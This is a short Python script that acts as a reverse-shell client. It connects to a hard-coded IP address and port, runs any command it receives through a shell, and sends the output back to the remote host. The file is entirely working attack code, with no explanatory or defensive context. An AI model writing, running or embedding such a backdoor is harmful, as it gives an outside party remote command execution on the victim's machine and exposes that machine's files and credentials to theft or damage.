import socket
import os
import subprocess
import pyautogui
s=socket.socket()
host="192.168.1.34"
port=9999
s.connect((host,port))
# ip address does not change when system is kept on sleep win+l

while True:
	data = s.recv(1024)
	if (data[:2].decode("utf-8")) == "cd":
		os.chdir((data[3:].decode("utf-8")))
	if len(data)>0:
		cmd=subprocess.Popen((data[:].decode("utf-8")),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		output_byte = cmd.stdout.read() + cmd.stderr.read()
		cwd = os.getcwd() + ">"
		output_str= str(output_byte,"utf-8")+str(cwd)
		s.send(str.encode(output_str))
		print(output_str)
	print(data[:].decode("utf-8"))